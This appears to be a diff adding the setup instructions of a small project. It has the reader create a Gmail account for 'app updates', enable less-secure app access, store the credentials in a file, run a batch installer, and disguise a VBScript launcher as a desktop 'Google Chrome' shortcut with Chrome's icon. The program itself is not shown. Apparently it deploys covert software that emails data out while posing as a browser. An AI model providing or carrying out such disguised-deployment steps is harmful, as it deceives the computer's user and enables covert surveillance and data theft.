@@ -1,0 +1,9 @@
+1. Download from Github
+2. Create a new Gmail account to receive app updates
+3. Enable app access for the Google Account via https://www.google.com/settings/security/lesssecureapps
+4. Input the new Gmail account credentials in credentials.txt
+5. Run installPackages.bat
+6. Create a shortcut of makeShortcut.vbs and name it to "Google Chrome"
+7. Right click on the new shortcut "Google Chrome" and select properties
+8. Click "Change Icon..." and select "ChromeIcon.ico"
+9. Move the new shortcut "Google Chrome" to the desktop
